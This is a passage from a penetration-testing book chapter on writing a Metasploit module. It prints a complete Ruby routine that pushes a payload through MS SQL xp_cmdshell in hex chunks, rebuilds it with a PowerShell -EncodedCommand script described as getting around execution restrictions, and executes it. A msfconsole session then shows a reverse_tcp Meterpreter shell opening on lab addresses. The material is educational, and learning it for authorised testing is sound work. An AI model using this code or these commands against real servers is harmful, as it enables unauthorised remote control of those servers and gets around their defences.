the CRLFs are stripped out, <code class="literal">Convert::ToByte</code> is invoked in the hex-based Metasploit payload. We tell PowerShell that the file’s format is base 16 (hexadecimal format) and to write it out to a file called <span class="strong"><em class="calibre4">#{var_payload}.exe</em></span> (our random payload name). After the payload has been written, we can run a method for executing PowerShell commands in an encoded format that is supported by the PowerShell programming language. These encoded commands allow us to execute lengthy and large amounts of code on one line.<a id="IDX-CHP-13-0054" class="strong"/><a id="IDX-CHP-13-0055" class="strong"/></p><p class="calibre2">By first converting the <code class="literal">h2b</code> string at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15741" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> to Unicode and then Base64 encoding the resultant string at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15747" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, we can pass the <code class="literal">-EncodedCommand</code> flag through PowerShell to bypass execution restrictions that would normally exist. The execution restriction policies do not allow untrusted scripts to be executed. (These restrictions are an important way to protect users from executing just any script they download on the Internet.) If we didn’t encode these commands, we wouldn’t be able to execute our PowerShell code and ultimately wouldn’t be able to compromise the target system. Encoding the commands allow us to add lots of code to one command without worrying about execution restriction policies.<a id="IDX-CHP-13-0056" class="strong"/></p><p class="calibre2">After we specified the <code class="literal">h2b</code> string and encoded command flags, we get the PowerShell commands in the correct encoded format so that we can execute our PowerShell code in an unrestricted format.</p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15766" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, the string was converted to Unicode; this is a requirement to have the arguments and information passed to PowerShell. The <code class="literal">h2b_encoded = Rex::Text.encoded_base64(h2b_unicode)</code> is then passed to convert it to a Base64-encoded string to be passed through MS SQL. Base64 is the encoding required to leverage the <code class="literal">-EncodedCommand</code> flag. We first converted our string to Unicode, and then to Base64, which is the format we need for all of our PowerShell commands. Finally, at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15778" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> a message stating that we are in the process of uploading the payload is printed to the console.<a id="IDX-CHP-13-0057" class="strong"/><a id="IDX-CHP-13-0058" class="strong"/><a id="IDX-CHP-13-0059" class="strong"/><a id="IDX-CHP-13-0060" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="counters">Counters</h3></div></div></div><p class="calibre2">Counters help you track your location in a file or keep track of how much data the program has read in. In the next example, a base counter called <code class="literal">idx</code> starts at <code class="literal">0</code>. The counter is used to identify the end of the file and move up 500 bytes at a time when the hexadecimal-based binary is being sent to the operating system. Essentially, the counter is saying, “Read 500 bytes, and then send. Read another 500 bytes, and then send,” until it reaches the end of the file.</p><a id="I_programlisting13_d1e15812" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> idx=0
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> cnt = 500
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> while(idx &lt; hex.length - 1)
  mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}&gt;&gt;%TEMP%\\#{var_payload}", false)
  idx += cnt
  end
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
 <strong class="calibre3"><code class="calibre6">print_status("Converting the payload utilizing PowerShell EncodedCommand...")</code></strong>
  mssql_xpcmdshell(<strong class="calibre3"><code class="calibre6">"powershell -EncodedCommand #{h2b_encoded}"</code></strong>, debug)
  mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
  print_status("Executing the payload...")
  mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout =&gt; 1})
  print_status("Be sure to cleanup #{var_payload}.exe...")
  end</pre><p class="calibre2">Recall that to deliver the payload to the target operating system, we need to split it into 500-byte chunks. We use the counters <code class="literal">idx</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15848" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and <code class="literal">cnt</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15857" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> to track how the payload is being split up. The counter <code class="literal">idx</code> will gradually increase by 500, and we set the other counter <code class="literal">cnt</code> to 500 (we need to read in 500 bytes at a time). After the first 500 bytes have been read from the Metasploit payload at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15870" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, the 500 hexadecimal characters will be sent to the target machine. The 500-byte chunks continue to be added until the <code class="literal">idx</code> counter reaches the same length as the payload, which equals the end of the file.</p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15881" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> we see a message that the payload is being converted and sent to the target using the <code class="literal">-EncodedCommand</code> PowerShell command, which is where the conversion is occurring from the normal PowerShell command to a Base64 encoded format (mentioned earlier).</p><p class="calibre2">The line <code class="literal">"powershell -EncodedCommand #{h2b_encoded}"</code> tells us that the payload has executed. The PowerShell commands that we converted to Base64 will convert the hexadecimal-based payload back to binary after it is executed.</p><p class="calibre2">The following shows the entire <span class="strong"><em class="calibre4">mssql.rb</em></span> file:<a id="IDX-CHP-13-0061" class="strong"/><a id="IDX-CHP-13-0062" class="strong"/><a id="IDX-CHP-13-0063" class="strong"/></p><a id="I_programlisting13_d1e15913" class="strong"/><pre class="programlisting">#
# Upload and execute a Windows binary through MSSQL queries and Powershell
#
def powershell_upload_exec(exe, debug=false)

          # hex converter
          hex = exe.unpack("H*")[0]
          # create random alpha 8 character names
          #var_bypass  = rand_text_alpha(8)
          var_payload = rand_text_alpha(8)
          print_status("Warning: This module will leave #{var_payload}.exe in the SQL
               Server %TEMP% directory")
          # our payload converter, grabs a hex file and converts
 it to binary for us through
               powershell
          h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s
 = [string]::Join('', $s);$s
                = $s.Replace('`r',''); $s = $s.Replace('`n','');$b
 = new-object byte[]$($s
                .Length/2);0..$($b.Length-1) | %{$b[$_] =
 [Convert]::ToByte($s.Substring
                ($($_*2),2),16)};[IO.File]::WriteAllBytes
('C:\\Windows\\Temp\\#{var_payload}
                .exe',$b)"
          h2b_unicode=Rex::Text.to_unicode(h2b)
          # base64 encode it, this allows us to perform execution
 through powershell without
               registry changes
          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
          print_status("Uploading the payload #{var_payload}, please be patient...")
          idx = 0
          cnt = 500
          while(idx &lt; hex.length - 1)
               mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}
&gt;&gt;%TEMP%\\#{var_payload}", false)
               idx += cnt
          end
          print_status("Converting the payload utilizing
 PowerShell EncodedCommand...")
          mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
          print_status("Executing the payload...")
          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout =&gt; 1})
          print_status("Be sure to cleanup #{var_payload}.exe...")
     end</pre></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="running_the_exploit">Running the Exploit</h3></div></div></div><p class="calibre2">With our work on <span class="strong"><em class="calibre4">mssql_powershell.rb</em></span> and <span class="strong"><em class="calibre4">mssql.rb</em></span> complete, we can run the exploit through Metasploit and <span class="strong"><em class="calibre4">msfconsole</em></span>. But before we do, we need to make sure that PowerShell is installed. Then we can run the following commands to execute our newly created exploit:</p><a id="I_programlisting13_d1e15929" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/mssql/mssql_powershell</code></strong>
msf exploit(mssql_powershell) &gt; <strong class="calibre3"><code class="calibre6">set payload windows/meterpreter/reverse_tcp</code></strong>
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(mssql_powershell) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.129</code></strong>
LHOST =&gt; 172.16.32.129
msf exploit(mssql_powershell) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 172.16.32.136</code></strong>
RHOST =&gt; 172.16.32.136
msf exploit(mssql_powershell) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

[*] Started reverse handler on 172.16.32.129:4444
[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory
[*] Uploading the payload CztBAnfG, please be patient...
[*] Converting the payload utilizing PowerShell EncodedCommand...
[*] Executing the payload...
[*] Sending stage (748032 bytes) to 172.16.32.136
[*] Be sure to cleanup CztBAnfG.exe...
[*] Meterpreter session 1 opened (172.16.32.129:4444 -&gt;
 172.16.32.136:49164) at 2010-05-17
       16:12:19 −0400

meterpreter &gt;</pre></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="the_power_of_code_reuse">The Power of Code Reuse</h2></div></div></div><p class="calibre2">This process of leveraging existing code, tweaking it, and adding in some original code is one of the most powerful things we can do with Metasploit. You have no reason to start from scratch in most situations after you have a feel for the Framework and you take a look at how existing code works. Because this module was essentially built for you, you can get more practice by going through other Metasploit modules and seeing what they are doing and how they work. You’ll start to learn the basics of buffer overflows and how they are created. Notice how the code is structured and how it works, and then create your own exploits from scratch. If you’re not familiar with the Ruby programming language or if this chapter was a bit over your head, pick up a book and read and learn. The best way to learn how to create these types of module development is through trial and error.<a id="IDX-CHP-13-0064" class="strong"/><a id="IDX-CHP-13-0065" class="strong"/></p></div></section></body></html>